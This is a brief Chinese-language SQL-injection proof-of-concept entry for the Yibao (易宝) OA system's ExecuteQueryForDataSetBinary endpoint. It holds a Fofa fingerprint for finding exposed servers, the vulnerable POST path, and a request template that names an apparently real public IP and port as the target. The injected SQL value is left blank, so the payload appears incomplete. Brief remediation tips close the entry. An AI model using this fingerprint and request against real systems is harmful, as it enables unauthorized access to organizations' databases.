# 易宝ExecuteQueryForDataSetBinarysql注入

- **系统**：易宝ExecuteQueryForDataSetBinary　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="顶讯科技-易宝OA系统"`
- **请求**：`POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="顶讯科技-易宝OA系统"
2、隐患url,复现如下
3、POC
Host: 218.4.200.210:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
token=zxh&cmdText=
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。